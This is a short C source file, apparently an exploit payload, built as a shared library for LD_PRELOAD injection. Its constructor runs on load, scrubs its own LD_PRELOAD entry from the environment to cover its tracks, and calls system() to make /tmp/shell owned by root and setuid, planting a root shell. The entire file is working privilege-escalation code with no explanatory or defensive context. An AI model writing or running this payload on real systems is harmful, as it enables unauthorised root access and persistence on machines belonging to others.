// gcc -shared -fPIC -o /tmp/shell_preload.so shell_preload.c

#include <stdlib.h>
#include <string.h>

extern char **environ;

int __attribute__((constructor)) ctor()
{
	char **p = environ;
	while (*p) {
		if (!strcmp(*p, "LD_PRELOAD=/tmp/shell_preload.so")) {
			*p[0] = 'X';
			break;
		}
		p++;
	}

	system("/bin/chown 0:0 /tmp/shell 2>/dev/null");
	system("/bin/chmod +sx /tmp/shell 2>/dev/null");

	return 0;
}
